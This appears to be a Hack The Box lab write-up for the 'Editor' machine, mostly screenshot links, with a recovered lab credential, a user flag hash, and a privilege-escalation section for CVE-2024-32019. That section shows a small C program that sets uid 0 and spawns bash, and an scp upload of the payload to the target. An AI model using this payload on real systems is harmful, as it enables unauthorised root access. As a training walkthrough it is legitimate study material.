[[HTB Labs]]
![[Pasted image 20250813014825.png]]
# Recon
### Port scan

![[Pasted image 20250813000630.png]]

![[Pasted image 20250813000647.png]]

### Directory Scanning
![[Pasted image 20250813000743.png]]

### Port 8080
![[Pasted image 20250813000900.png]]
![[Pasted image 20250813000912.png]]

One thing that i found that this version has Vulnerablity
#### CVE-2024-24893 (research)
![[Pasted image 20250813004737.png]]

![[Pasted image 20250813004731.png]]
![[Pasted image 20250813004420.png]]
oliver:theEd1t0rTeam99

## User Flag
![[Pasted image 20250813004854.png]]
fd34f52daa038148803970a066da1b93
# Priv Escalation

This type of vulnerable is `Privilege Escalation via ndsudo (Netdata Local Exploit)
**[CVE-2024-32019](https://github.com/AzureADTrent/CVE-2024-32019-POC)**

```
┌──(root㉿kali)-[/home/kali/Desktop/HTB/Editor]
└─# cat poc.c
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

```
scp nvme oliver@editor.htb:/tmp/
oliver@editor.htb's password: 
nvme 
```


![[Pasted image 20250813014330.png]]

![[Pasted image 20250813014250.png]]
